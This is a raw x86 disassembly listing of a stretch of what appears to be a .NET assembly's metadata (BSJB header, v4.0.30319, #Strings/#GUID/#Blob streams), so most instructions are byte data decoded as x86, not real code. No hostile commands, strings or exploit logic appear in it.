  4056b6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056bc:	00 0a                	add    %cl,(%edx)
  4056be:	0b 06                	or     (%esi),%eax
  4056c0:	07                   	pop    %es
  4056c1:	16                   	push   %ss
  4056c2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 06                	or     (%esi),%al
  4056c9:	17                   	pop    %ss
  4056ca:	73 10                	jae    0x4056dc
  4056cc:	01 00                	add    %eax,(%eax)
  4056ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056d1:	02 16                	add    (%esi),%dl
  4056d3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	0a de                	or     %dh,%bl
  4056e2:	0a 08                	or     (%eax),%cl
  4056e4:	2c 06                	sub    $0x6,%al
  4056e6:	08 6f 33             	or     %ch,0x33(%edi)
  4056e9:	00 00                	add    %al,(%eax)
  4056eb:	0a dc                	or     %ah,%bl
  4056ed:	06                   	push   %es
  4056ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ef:	09 01                	or     %eax,(%ecx)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4056f8:	06                   	push   %es
  4056f9:	06                   	push   %es
  4056fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fb:	33 00                	xor    (%eax),%eax
  4056fd:	00 0a                	add    %cl,(%edx)
  4056ff:	dc 09                	fmull  (%ecx)
  405701:	2a 00                	sub    (%eax),%al
  405703:	00 01                	add    %al,(%ecx)
  405705:	1c 00                	sbb    $0x0,%al
  405707:	00 02                	add    %al,(%edx)
  405709:	00 20                	add    %ah,(%eax)
  40570b:	00 13                	add    %dl,(%ebx)
  40570d:	33 00                	xor    (%eax),%eax
  40570f:	0a 00                	or     (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 06                	add    %al,(%esi)
  405717:	00 40 46             	add    %al,0x46(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 00                	add    %al,(%eax)
  405720:	42                   	inc    %edx
  405721:	53                   	push   %ebx
  405722:	4a                   	dec    %edx
  405723:	42                   	inc    %edx
  405724:	01 00                	add    %eax,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	0c 00                	or     $0x0,%al
  40572e:	00 00                	add    %al,(%eax)
  405730:	76 34                	jbe    0x405766
  405732:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405735:	33 30                	xor    (%eax),%esi
  405737:	33 31                	xor    (%ecx),%esi
  405739:	39 00                	cmp    %eax,(%eax)
  40573b:	00 00                	add    %al,(%eax)
  40573d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405743:	00 64 1d 00          	add    %ah,0x0(%ebp,%ebx,1)
  405747:	00 23                	add    %ah,(%ebx)
  405749:	7e 00                	jle    0x40574b
  40574b:	00 d0                	add    %dl,%al
  40574d:	1d 00 00 5c 1d       	sbb    $0x1d5c0000,%eax
  405752:	00 00                	add    %al,(%eax)
  405754:	23 53 74             	and    0x74(%ebx),%edx
  405757:	72 69                	jb     0x4057c2
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	67 73 00             	addr16 jae 0x40575d
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 2c 3b             	add    %ch,(%ebx,%edi,1)
  405762:	00 00                	add    %al,(%eax)
  405764:	94                   	xchg   %eax,%esp
  405765:	27                   	daa
  405766:	00 00                	add    %al,(%eax)
  405768:	23 55 53             	and    0x53(%ebp),%edx
  40576b:	00 c0                	add    %al,%al
  40576d:	62 00                	bound  %eax,(%eax)
  40576f:	00 10                	add    %dl,(%eax)
  405771:	00 00                	add    %al,(%eax)
  405773:	00 23                	add    %ah,(%ebx)
  405775:	47                   	inc    %edi
  405776:	55                   	push   %ebp
  405777:	49                   	dec    %ecx
  405778:	44                   	inc    %esp
  405779:	00 00                	add    %al,(%eax)
  40577b:	00 d0                	add    %dl,%al
  40577d:	62 00                	bound  %eax,(%eax)
  40577f:	00 68 09             	add    %ch,0x9(%eax)
  405782:	00 00                	add    %al,(%eax)
  405784:	23 42 6c             	and    0x6c(%edx),%eax
  405787:	6f                   	outsl  %ds:(%esi),(%dx)
  405788:	62 00                	bound  %eax,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	00 00                	add    %al,(%eax)
  40578e:	00 00                	add    %al,(%eax)
  405790:	02 00                	add    (%eax),%al
  405792:	00 01                	add    %al,(%ecx)
  405794:	57                   	push   %edi
  405795:	9f                   	lahf
  405796:	a2 3f 09 0a 00       	mov    %al,0xa093f
  40579b:	00 00                	add    %al,(%eax)
  40579d:	fa                   	cli
  40579e:	25 33 00 16 00       	and    $0x160033,%eax
  4057a3:	00 01                	add    %al,(%ecx)
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 9b 00 00 00 1d    	add    %bl,0x1d000000(%ebx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 45 00             	add    %al,0x0(%ebp)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	a1 00 00 00 6e       	mov    0x6e000000,%eax
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 02                	add    %al,(%edx)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 10                	add    %dl,(%eax)
  4057c1:	01 00                	add    %eax,(%eax)
  4057c3:	00 13                	add    %dl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 2e                	add    %ch,(%esi)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	12 00                	adc    (%eax),%al
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	1e                   	push   %ds
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e2:	00 00                	add    %al,(%eax)
  4057e4:	02 00                	add    (%eax),%al
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	06                   	push   %es
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	02 00                	add    (%eax),%al
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	01 00                	add    %eax,(%eax)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	08 00                	or     %al,(%eax)
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	04 00                	add    $0x0,%al
  4057fe:	00 00                	add    %al,(%eax)
  405800:	03 00                	add    (%eax),%eax
  405802:	00 00                	add    %al,(%eax)
  405804:	00 00                	add    %al,(%eax)
  405806:	b5 0a                	mov    $0xa,%ch
  405808:	01 00                	add    %eax,(%eax)
  40580a:	00 00                	add    %al,(%eax)
  40580c:	00 00                	add    %al,(%eax)
  40580e:	06                   	push   %es
  40580f:	00 f7                	add    %dh,%bh
  405811:	18 82 0f 0a 00 8a    	sbb    %al,-0x75fff5f1(%edx)
  405817:	00 a4 15 0a 00 5d 19 	add    %ah,0x195d000a(%ebp,%edx,1)
  40581e:	30 18                	xor    %bl,(%eax)
  405820:	0a 00                	or     (%eax),%al
  405822:	1d 0f 29 1d 06       	sbb    $0x61d290f,%eax
  405827:	00 c5                	add    %al,%ch
  405829:	13 5c 0b 06          	adc    0x6(%ebx,%ecx,1),%ebx
  40582d:	00 48 08             	add    %cl,0x8(%eax)
  405830:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405831:	15 0a 00 36 10       	adc    $0x1036000a,%eax
  405836:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405837:	15 0a 00 b9 17       	adc    $0x17b9000a,%eax
  40583c:	29 1d 06 00 c5 19    	sub    %ebx,0x19c50006
  405842:	82 0f 06             	orb    $0x6,(%edi)
  405845:	00 a6 0b aa 1b 06    	add    %ah,0x61baa0b(%esi)
  40584b:	00 4a 14             	add    %cl,0x14(%edx)
  40584e:	73 17                	jae    0x405867
  405850:	06                   	push   %es
  405851:	00 2b                	add    %ch,(%ebx)
  405853:	00 b7 02 06 00 76    	add    %dh,0x76000602(%edi)
  405859:	05 73 17 06 00       	add    $0x61773,%eax
  40585e:	56                   	push   %esi
  40585f:	0f 4d 02             	cmovge (%edx),%eax
  405862:	06                   	push   %es
  405863:	00 f3                	add    %dh,%bl
  405865:	0f 82 0f 0a 00 02    	jb     0x240627a
  40586b:	18 e4                	sbb    %ah,%ah
  40586d:	14 0e                	adc    $0xe,%al
  40586f:	00 99 11 b3 0b 0e    	add    %bl,0xe0bb311(%ecx)
  405875:	00 82 18 b3 0b 06    	add    %al,0x60bb318(%edx)
  40587b:	00 e2                	add    %ah,%dl
  40587d:	1b 5c 0b 0a          	sbb    0xa(%ebx,%ecx,1),%ebx
  405881:	00 c5                	add    %al,%ch
  405883:	16                   	push   %ss
  405884:	55                   	push   %ebp
  405885:	00 12                	add    %dl,(%edx)
  405887:	00 20                	add    %ah,(%eax)
  405889:	00 3c 15 12 00 01 00 	add    %bh,0x10012(,%edx,1)
  405890:	82 0f 12             	orb    $0x12,(%edi)
  405893:	00 a4 08 3c 15 06 00 	add    %ah,0x6153c(%eax,%ecx,1)
  40589a:	c3                   	ret
  40589b:	07                   	pop    %es
  40589c:	82 0f 06             	orb    $0x6,(%edi)
  40589f:	00 b1 09 3c 15 06    	add    %dh,0x6153c09(%ecx)
  4058a5:	00 1e                	add    %bl,(%esi)
  4058a7:	0a 3c 15 06 00 ce 08 	or     0x8ce0006(,%edx,1),%bh
  4058ae:	e4 14                	in     $0x14,%al
  4058b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4058b1:	00 5c 15 00          	add    %bl,0x0(%ebp,%edx,1)
  4058b5:	00 06                	add    %al,(%esi)
  4058b7:	00 f6                	add    %dh,%dh
  4058b9:	08 e3                	or     %ah,%bl
  4058bb:	10 06                	adc    %al,(%esi)
  4058bd:	00 7d 09             	add    %bh,0x9(%ebp)
  4058c0:	e3 10                	jecxz  0x4058d2
  4058c2:	06                   	push   %es
  4058c3:	00 5e 09             	add    %bl,0x9(%esi)
  4058c6:	e3 10                	jecxz  0x4058d8
  4058c8:	06                   	push   %es
  4058c9:	00 05 0a e3 10 06    	add    %al,0x610e30a
  4058cf:	00 d1                	add    %dl,%cl
  4058d1:	09 e3                	or     %esp,%ebx
  4058d3:	10 06                	adc    %al,(%esi)
  4058d5:	00 ea                	add    %ch,%dl
  4058d7:	09 e3                	or     %esp,%ebx
  4058d9:	10 06                	adc    %al,(%esi)
  4058db:	00 0d 09 e3 10 06    	add    %cl,0x610e309
  4058e1:	00 e2                	add    %ah,%dl
  4058e3:	08 1d 15 06 00 41    	or     %bl,0x41000615
  4058e9:	09 e3                	or     %esp,%ebx
  4058eb:	10 06                	adc    %al,(%esi)
  4058ed:	00 28                	add    %ch,(%eax)
  4058ef:	09 ca                	or     %ecx,%edx
  4058f1:	0b 06                	or     (%esi),%eax
  4058f3:	00 b3 08 3c 15 06    	add    %dh,0x6153c08(%ebx)
  4058f9:	00 9a 09 e3 10 06    	add    %bl,0x610e309(%edx)
  4058ff:	00 0e                	add    %cl,(%esi)
  405901:	03 5c 0b 06          	add    0x6(%ebx,%ecx,1),%ebx
  405905:	00 5f 1b             	add    %bl,0x1b(%edi)
  405908:	82 0f 06             	orb    $0x6,(%edi)
  40590b:	00 5d 1a             	add    %bl,0x1a(%ebp)
  40590e:	82 0f 06             	orb    $0x6,(%edi)
  405911:	00 d4                	add    %dl,%ah
  405913:	0f 82 0f 06 00 aa    	jb     0xaa405f28
  405919:	0b aa 1b 0a 00 6e    	or     0x6e000a1b(%edx),%ebp
  40591f:	1c a4                	sbb    $0xa4,%al
  405921:	15 06 00 ad 0f       	adc    $0xfad0006,%eax
  405926:	9c                   	pushf
  405927:	1c 06                	sbb    $0x6,%al
  405929:	00 93 12 9c 1c 06    	add    %dl,0x61c9c12(%ebx)
  40592f:	00 3d 0b 9c 1c 06    	add    %bh,0x61c9c0b
  405935:	00 87 11 82 0f 0a    	add    %al,0xa0f8211(%edi)
  40593b:	00 12                	add    %dl,(%edx)
  40593d:	18 1c 19             	sbb    %bl,(%ecx,%ebx,1)
  405940:	0a 00                	or     (%eax),%al
  405942:	e3 19                	jecxz  0x40595d
  405944:	1c 19                	sbb    $0x19,%al
  405946:	0a 00                	or     (%eax),%al
  405948:	45                   	inc    %ebp
  405949:	0e                   	push   %cs
  40594a:	1c 19                	sbb    $0x19,%al
  40594c:	0a 00                	or     (%eax),%al
  40594e:	c2 1c 30             	ret    $0x301c
  405951:	18 0a                	sbb    %cl,(%edx)
  405953:	00 f8                	add    %bh,%al
  405955:	07                   	pop    %es
  405956:	30 18                	xor    %bl,(%eax)
  405958:	0a 00                	or     (%eax),%al
  40595a:	e3 07                	jecxz  0x405963
  40595c:	30 18                	xor    %bl,(%eax)
  40595e:	06                   	push   %es
  40595f:	00 87 0c 82 0f 06    	add    %al,0x60f820c(%edi)
  405965:	00 68 12             	add    %ch,0x12(%eax)
  405968:	82 0f 0a             	orb    $0xa,(%edi)
  40596b:	00 66 17             	add    %ah,0x17(%esi)
  40596e:	1c 19                	sbb    $0x19,%al
  405970:	0a 00                	or     (%eax),%al
  405972:	00 17                	add    %dl,(%edi)
  405974:	1c 19                	sbb    $0x19,%al
  405976:	06                   	push   %es
  405977:	00 86 17 82 0f 06    	add    %al,0x60f8217(%esi)
  40597d:	00 82 05 82 0f 0a    	add    %al,0xa0f8205(%edx)
  405983:	00 0f                	add    %cl,(%edi)
  405985:	0f 30                	wrmsr
  405987:	18 0a                	sbb    %cl,(%edx)
  405989:	00 8f 0d 29 1d 0a    	add    %cl,0xa1d290d(%edi)
  40598f:	00 04 1b             	add    %al,(%ebx,%ebx,1)
  405992:	1c 19                	sbb    $0x19,%al
  405994:	0a 00                	or     (%eax),%al
  405996:	f5                   	cmc
  405997:	10 a4 15 0a 00 24 17 	adc    %ah,0x1724000a(%ebp,%edx,1)
  40599e:	c4 10                	les    (%eax),%edx
  4059a0:	06                   	push   %es
  4059a1:	00 5e 0a             	add    %bl,0xa(%esi)
  4059a4:	82 0f 06             	orb    $0x6,(%edi)
  4059a7:	00 b3 0d 5c 0b 06    	add    %dh,0x60b5c0d(%ebx)
  4059ad:	00 81 0d 82 0f 0a    	add    %al,0xa0f820d(%ecx)
  4059b3:	00 46 0d             	add    %al,0xd(%esi)
  4059b6:	82 0f 0a             	orb    $0xa,(%edi)
  4059b9:	00 af 07 82 0f 06    	add    %ch,0x60f8207(%edi)
  4059bf:	00 2f                	add    %ch,(%edi)
  4059c1:	14 82                	adc    $0x82,%al
  4059c3:	0f 06                	clts
  4059c5:	00 46 1b             	add    %al,0x1b(%esi)
  4059c8:	5c                   	pop    %esp
  4059c9:	0b 06                	or     (%esi),%eax
  4059cb:	00 50 0f             	add    %dl,0xf(%eax)
  4059ce:	4d                   	dec    %ebp
  4059cf:	02 06                	add    (%esi),%al
  4059d1:	00 b5 14 5c 0b 0a    	add    %dh,0xa0b5c14(%ebp)
  4059d7:	00 2c 05 30 18 06 00 	add    %ch,0x61830(,%eax,1)
  4059de:	a9 01 82 0f 06       	test   $0x60f8201,%eax
  4059e3:	00 c5                	add    %al,%ch
  4059e5:	12 aa 1b 33 00 93    	adc    -0x6cffcce5(%edx),%ch
  4059eb:	14 00                	adc    $0x0,%al
  4059ed:	00 06                	add    %al,(%esi)
  4059ef:	00 da                	add    %bl,%dl
  4059f1:	00 82 0f 06 00 c7    	add    %al,-0x38fff9f1(%edx)
  4059f7:	00 82 0f 06 00 9b    	add    %al,-0x64fff9f1(%edx)
  4059fd:	05 82 0f 06 00       	add    $0x60f82,%eax
  405a02:	19 06                	sbb    %eax,(%esi)
  405a04:	82 0f 06             	orb    $0x6,(%edi)
  405a07:	00 63 07             	add    %ah,0x7(%ebx)
  405a0a:	82 0f 06             	orb    $0x6,(%edi)
  405a0d:	00 04 0f             	add    %al,(%edi,%ecx,1)
  405a10:	4d                   	dec    %ebp
  405a11:	02 06                	add    (%esi),%al
  405a13:	00 46 06             	add    %al,0x6(%esi)
  405a16:	4d                   	dec    %ebp
  405a17:	02 06                	add    (%esi),%al
  405a19:	00 dc                	add    %bl,%ah
  405a1b:	04 4d                	add    $0x4d,%al
  405a1d:	02 06                	add    (%esi),%al
  405a1f:	00 d9                	add    %bl,%cl
  405a21:	17                   	pop    %ss
  405a22:	4d                   	dec    %ebp
  405a23:	02 06                	add    (%esi),%al
  405a25:	00 03                	add    %al,(%ebx)
  405a27:	08 4d 02             	or     %cl,0x2(%ebp)
  405a2a:	06                   	push   %es
  405a2b:	00 aa 17 3c 15 06    	add    %ch,0x6153c17(%edx)
  405a31:	00 2f                	add    %ch,(%edi)
  405a33:	1c 82                	sbb    $0x82,%al
  405a35:	0f 06                	clts
  405a37:	00 ad 05 82 0f 06    	add    %ch,0x60f8205(%ebp)
  405a3d:	00 14 10             	add    %dl,(%eax,%edx,1)
  405a40:	82 0f 06             	orb    $0x6,(%edi)
  405a43:	00 b1 11 4d 02 0a    	add    %dh,0xa024d11(%ecx)
  405a49:	00 01                	add    %al,(%ecx)
  405a4b:	12 e4                	adc    %ah,%ah
  405a4d:	14 06                	adc    $0x6,%al
  405a4f:	00 8b 1c 55 00 06    	add    %cl,0x600551c(%ebx)
  405a55:	00 11                	add    %dl,(%ecx)
  405a57:	14 4d                	adc    $0x4d,%al
  405a59:	02 06                	add    (%esi),%al
  405a5b:	00 09                	add    %cl,(%ecx)
  405a5d:	0d 4d 02 0a 00       	or     $0xa024d,%eax
  405a62:	76 06                	jbe    0x405a6a
  405a64:	e4 14                	in     $0x14,%al
  405a66:	06                   	push   %es
  405a67:	00 c4                	add    %al,%ah
  405a69:	11 4d 02             	adc    %ecx,0x2(%ebp)
  405a6c:	0a 00                	or     (%eax),%al
  405a6e:	94                   	xchg   %eax,%esp
  405a6f:	06                   	push   %es
  405a70:	e4 14                	in     $0x14,%al
  405a72:	06                   	push   %es
  405a73:	00 06                	add    %al,(%esi)
  405a75:	1d 55 00 16 00       	sbb    $0x160055,%eax
  405a7a:	aa                   	stos   %al,%es:(%edi)
  405a7b:	16                   	push   %ss
  405a7c:	d2 02                	rolb   %cl,(%edx)
  405a7e:	06                   	push   %es
  405a7f:	00 d0                	add    %dl,%al
  405a81:	0d 55 00 06 00       	or     $0x60055,%eax
  405a86:	1e                   	push   %ds
  405a87:	14 4d                	adc    $0x4d,%al
  405a89:	02 06                	add    (%esi),%al
  405a8b:	00 ba 11 4d 02 16    	add    %bh,0x16024d11(%edx)
  405a91:	00 d3                	add    %dl,%bl
  405a93:	11 ff                	adc    %edi,%edi
  405a95:	14 1a                	adc    $0x1a,%al
  405a97:	00 92 13 4b 1a 1a    	add    %dl,0x1a1a4b13(%edx)
  405a9d:	00 0f                	add    %cl,(%edi)
  405a9f:	11 4b 1a             	adc    %ecx,0x1a(%ebx)
  405aa2:	bb 01 56 14 00       	mov    $0x145601,%ebx
  405aa7:	00 1a                	add    %bl,(%edx)
  405aa9:	00 d9                	add    %bl,%cl
  405aab:	18 4b 1a             	sbb    %cl,0x1a(%ebx)
  405aae:	06                   	push   %es
  405aaf:	00 dd                	add    %bl,%ch
  405ab1:	14 82                	adc    $0x82,%al
  405ab3:	0f 06                	clts
  405ab5:	00 7a 00             	add    %bh,0x0(%edx)
  405ab8:	82 0f 12             	orb    $0x12,(%edi)
  405abb:	00 77 05             	add    %dh,0x5(%edi)
  405abe:	56                   	push   %esi
  405abf:	12 06                	adc    (%esi),%al
  405ac1:	00 12                	add    %dl,(%edx)
  405ac3:	00 b7 02 06 00 79    	add    %dh,0x79000602(%edi)
  405ac9:	0f 82 0f 06 00 7a    	jb     0x7a4060de
  405acf:	12 9c 1c 06 00 c1 0f 	adc    0xfc10006(%esp,%ebx,1),%bl
  405ad6:	9c                   	pushf
  405ad7:	1c 1e                	sbb    $0x1e,%al
  405ad9:	00 b8 10 51 17 06    	add    %bh,0x6175110(%eax)
  405adf:	00 3d 1d 57 0e 06    	add    %bh,0x60e571d
  405ae5:	00 71 0e             	add    %dh,0xe(%ecx)
  405ae8:	57                   	push   %edi
  405ae9:	0e                   	push   %cs
  405aea:	06                   	push   %es
  405aeb:	00 54 06 57          	add    %dl,0x57(%esi,%eax,1)
  405aef:	0e                   	push   %cs
  405af0:	06                   	push   %es
  405af1:	00 6c 03 82          	add    %ch,-0x7e(%ebx,%eax,1)
  405af5:	0f 06                	clts
  405af7:	00 f4                	add    %dh,%ah
  405af9:	05 5c 0b 0a 00       	add    $0xa0b5c,%eax
  405afe:	ab                   	stos   %eax,%es:(%edi)
  405aff:	13 55 00             	adc    0x0(%ebp),%edx
  405b02:	0a 00                	or     (%eax),%al
  405b04:	51                   	push   %ecx
  405b05:	18 55 00             	sbb    %dl,0x0(%ebp)
  405b08:	06                   	push   %es
  405b09:	00 aa 04 55 00 06    	add    %ch,0x6005504(%edx)
  405b0f:	00 46 10             	add    %al,0x10(%esi)
  405b12:	82 0f 06             	orb    $0x6,(%edi)
  405b15:	00 b9 1c e3 10 06    	add    %bh,0x610e31c(%ecx)
  405b1b:	00 fe                	add    %bh,%dh
  405b1d:	07                   	pop    %es
  405b1e:	82 0f 06             	orb    $0x6,(%edi)
  405b21:	00 9e 14 82 0f 06    	add    %bl,0x60f8214(%esi)
  405b27:	00 d0                	add    %dl,%al
  405b29:	05 82 0f 22 00       	add    $0x220f82,%eax
  405b2e:	e0 11                	loopne 0x405b41
  405b30:	f1                   	int1
  405b31:	12 22                	adc    (%edx),%ah
  405b33:	00 78 16             	add    %bh,0x16(%eax)
  405b36:	f1                   	int1
  405b37:	12 22                	adc    (%edx),%ah
  405b39:	00 18                	add    %bl,(%eax)
  405b3b:	13 f1                	adc    %ecx,%esi
  405b3d:	12 12                	adc    (%edx),%dl
  405b3f:	00 10                	add    %dl,(%eax)
  405b41:	13 3c 15 22 00 90 16 	adc    0x16900022(,%edx,1),%edi
  405b48:	f1                   	int1
  405b49:	12 06                	adc    (%esi),%al
  405b4b:	00 f6                	add    %dh,%dh
  405b4d:	15 9c 1c 06 00       	adc    $0x61c9c,%eax
  405b52:	7f 11                	jg     0x405b65
  405b54:	82 0f 06             	orb    $0x6,(%edi)
  405b57:	00 fd                	add    %bh,%ch
  405b59:	15 9c 1c 12 00       	adc    $0x121c9c,%eax
  405b5e:	ac                   	lods   %ds:(%esi),%al
  405b5f:	12 9c 1c 06 00 38 0f 	adc    0xf380006(%esp,%ebx,1),%bl
  405b66:	9c                   	pushf
  405b67:	1c 06                	sbb    $0x6,%al
  405b69:	00 fb                	add    %bh,%bl
  405b6b:	00 9c 1c 06 00 69 11 	add    %bl,0x11690006(%esp,%ebx,1)
  405b72:	82 0f 06             	orb    $0x6,(%edi)
  405b75:	00 9a 0f 9c 1c 06    	add    %bl,0x61c9c0f(%edx)
  405b7b:	00 21                	add    %ah,(%ecx)
  405b7d:	05 9c 1c 06 00       	add    $0x61c9c,%eax
  405b82:	e5 04                	in     $0x4,%eax
  405b84:	9c                   	pushf
  405b85:	1c 06                	sbb    $0x6,%al
  405b87:	00 db                	add    %bl,%bl
  405b89:	0f 9c 1c 06          	setl   (%esi,%eax,1)
  405b8d:	00 00                	add    %al,(%eax)
  405b8f:	05 9c 1c 06 00       	add    $0x61c9c,%eax
  405b94:	52                   	push   %edx
  405b95:	11 9c 1c 06 00 39 13 	adc    %ebx,0x13390006(%esp,%ebx,1)
  405b9c:	82 0f 06             	orb    $0x6,(%edi)
  405b9f:	00 23                	add    %ah,(%ebx)
  405ba1:	03 9c 1c 0a 00 45 0f 	add    0xf45000a(%esp,%ebx,1),%ebx
  405ba8:	a2 10 0a 00 11       	mov    %al,0x11000a10
  405bad:	05 a2 10 00 00       	add    $0x10a2,%eax
  405bb2:	00 00                	add    %al,(%eax)
  405bb4:	40                   	inc    %eax
  405bb5:	01 00                	add    %eax,(%eax)
  405bb7:	00 00                	add    %al,(%eax)
  405bb9:	00 01                	add    %al,(%ecx)
  405bbb:	00 01                	add    %al,(%ecx)
  405bbd:	00 01                	add    %al,(%ecx)
  405bbf:	00 10                	add    %dl,(%eax)
  405bc1:	00 5d 0f             	add    %bl,0xf(%ebp)
  405bc4:	44                   	inc    %esp
  405bc5:	1a 05 00 01 00 01    	sbb    0x1000100,%al
  405bcb:	00 81 01 10 00 bc    	add    %al,-0x43ffefff(%ecx)
  405bd1:	16                   	push   %ss
  405bd2:	44                   	inc    %esp
  405bd3:	1a 05 00 01 00 03    	sbb    0x3000100,%al
  405bd9:	00 81 01 10 00 57    	add    %al,0x57001001(%ecx)
  405bdf:	19 2a                	sbb    %ebp,(%edx)
  405be1:	11 05 00 12 00 06    	adc    %eax,0x6001200
  405be7:	00 01                	add    %al,(%ecx)
  405be9:	00 10                	add    %dl,(%eax)
  405beb:	00 46 17             	add    %al,0x17(%esi)
  405bee:	66 0d 05 00          	or     $0x5,%ax
  405bf2:	1c 00                	sbb    $0x0,%al
  405bf4:	22 00                	and    (%eax),%al
  405bf6:	01 00                	add    %eax,(%eax)
  405bf8:	10 00                	adc    %al,(%eax)
  405bfa:	ec                   	in     (%dx),%al
  405bfb:	0f 66 0d 05 00 1d 00 	pcmpgtd 0x1d0005,%mm1
  405c02:	2d 00 01 00 10       	sub    $0x10000100,%eax
  405c07:	00 09                	add    %cl,(%ecx)
  405c09:	1c 66                	sbb    $0x66,%al
  405c0b:	0d 05 00 1f 00       	or     $0x1f0005,%eax
  405c10:	31 00                	xor    %eax,(%eax)
  405c12:	01 00                	add    %eax,(%eax)
  405c14:	10 00                	adc    %al,(%eax)
  405c16:	79 0d                	jns    0x405c25
  405c18:	66 0d 05 00          	or     $0x5,%ax
  405c1c:	21 00                	and    %eax,(%eax)
  405c1e:	38 00                	cmp    %al,(%eax)
  405c20:	01 01                	add    %eax,(%ecx)
  405c22:	00 00                	add    %al,(%eax)
  405c24:	d7                   	xlat   %ds:(%ebx)
  405c25:	07                   	pop    %es
  405c26:	66 0d 3d 00          	or     $0x3d,%ax
  405c2a:	28 00                	sub    %al,(%eax)
  405c2c:	63 00                	arpl   %eax,(%eax)
  405c2e:	00 00                	add    %al,(%eax)
  405c30:	10 00                	adc    %al,(%eax)
  405c32:	31 17                	xor    %edx,(%edi)
  405c34:	66 0d 05 00          	or     $0x5,%ax
  405c38:	35 00 63 00 00       	xor    $0x6300,%eax
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 3b                	add    %bh,(%ebx)
  405c41:	17                   	pop    %ss
  405c42:	66 0d 05 00          	or     $0x5,%ax
  405c46:	35 00 67 00 00       	xor    $0x6700,%eax
  405c4b:	00 10                	add    %dl,(%eax)
  405c4d:	00 48 12             	add    %cl,0x12(%eax)
  405c50:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c51:	0e                   	push   %cs
  405c52:	05 00 35 00 70       	add    $0x70003500,%eax
  405c57:	00 00                	add    %al,(%eax)
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 dc                	add    %bl,%ah
  405c5d:	16                   	push   %ss
  405c5e:	dc 13                	fcoml  (%ebx)
  405c60:	05 00 35 00 72       	add    $0x72003500,%eax
  405c65:	00 00                	add    %al,(%eax)
  405c67:	00 10                	add    %dl,(%eax)
  405c69:	00 cb                	add    %cl,%bl
  405c6b:	13 dc                	adc    %esp,%ebx
  405c6d:	13 05 00 35 00 7b    	adc    0x7b003500,%eax
  405c73:	00 81 01 10 00 1c    	add    %al,0x1c001001(%ecx)
  405c79:	10 dc                	adc    %bl,%ah
  405c7b:	13 05 00 35 00 7e    	adc    0x7e003500,%eax
  405c81:	00 81 01 10 00 e1    	add    %al,-0x1effefff(%ecx)
  405c87:	12 dc                	adc    %ah,%bl
  405c89:	13 05 00 35 00 80    	adc    0x80003500,%eax
  405c8f:	00 80 01 10 00 f7    	add    %al,-0x8ffefff(%eax)
  405c95:	14 dc                	adc    $0xdc,%al
  405c97:	13 05 00 35 00 81    	adc    0x81003500,%eax
  405c9d:	00 02                	add    %al,(%edx)
  405c9f:	01 00                	add    %eax,(%eax)
  405ca1:	00 f2                	add    %dh,%dl
  405ca3:	01 00                	add    %eax,(%eax)
  405ca5:	00 3d 00 35 00 87    	add    %bh,0x87003500
  405cab:	00 81 01 10 00 e9    	add    %al,-0x16ffefff(%ecx)
  405cb1:	0e                   	push   %cs
  405cb2:	dc 13                	fcoml  (%ebx)
  405cb4:	05 00 39 00 87       	add    $0x87003900,%eax
  405cb9:	00 81 01 10 00 35    	add    %al,0x35001001(%ecx)
  405cbf:	0e                   	push   %cs
  405cc0:	dc 13                	fcoml  (%ebx)
  405cc2:	05 00 3a 00 89       	add    $0x89003a00,%eax
  405cc7:	00 81 01 10 00 03    	add    %al,0x3001001(%ecx)
  405ccd:	1d dc 13 05 00       	sbb    $0x513dc,%eax
  405cd2:	3a 00                	cmp    (%eax),%al
  405cd4:	8d 00                	lea    (%eax),%eax
  405cd6:	81 01 10 00 50 19    	addl   $0x19500010,(%ecx)
  405cdc:	32 19                	xor    (%ecx),%bl
  405cde:	05 00 3b 00 92       	add    $0x92003b00,%eax
  405ce3:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
